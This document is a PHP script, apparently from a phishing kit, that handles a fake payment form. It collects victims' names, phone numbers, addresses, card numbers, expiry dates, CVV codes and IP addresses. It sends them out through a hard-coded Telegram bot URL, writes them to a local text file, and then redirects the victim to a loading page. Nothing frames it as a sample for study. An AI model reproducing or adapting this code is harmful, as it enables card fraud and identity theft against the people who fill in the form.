<?php
session_start();
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$foo);
$result = curl_exec($ch);
curl_close($ch);
function curl_get_contents($url)
{
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($curl);
  curl_close($curl);
  if(empty($data)){
	file_get_contents($url);
  } 
  return $data;
}
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- Information personnal-----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= "firstname  : ".$_POST['prenom']."\n";
$message .= "lastname   : ".$_POST['lastname']."\n";
$message .= "Télephone mobile : ".$_POST['tele']."\n";
$message .= "Télephone fix  : ".$_POST['telefix']."\n";
$message .= "adresse   : ".$_POST['adresse']."\n";
$message .= "postale  : ".$_POST['postal']."\n";
$message .= "Ville   : ".$_POST['ville']."\n";
$message .= "------------------Info Card-------------------------\n";
$message .= "Card   : ".$_POST['cc']."\n";
$message .= "Date   : ".$_POST['epx']."\n";
$message .= "CVV  : ".$_POST['cvv']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

curl_get_contents("#" . urlencode($message)."" );

curl_get_contents("https://api.telegram.org/bot1526681968:AAFwPzPUVQF4hsTwHKKtjTci2AGoK0L348Q/sendMessage?chat_id=1310648202&text=" . urlencode($message)."" );


$file = fopen("../info.txt","a");
fwrite($file,$message); 


echo '<script language="Javascript">
<!--
document.location.replace("loading.htm");
// -->
</script>';
?>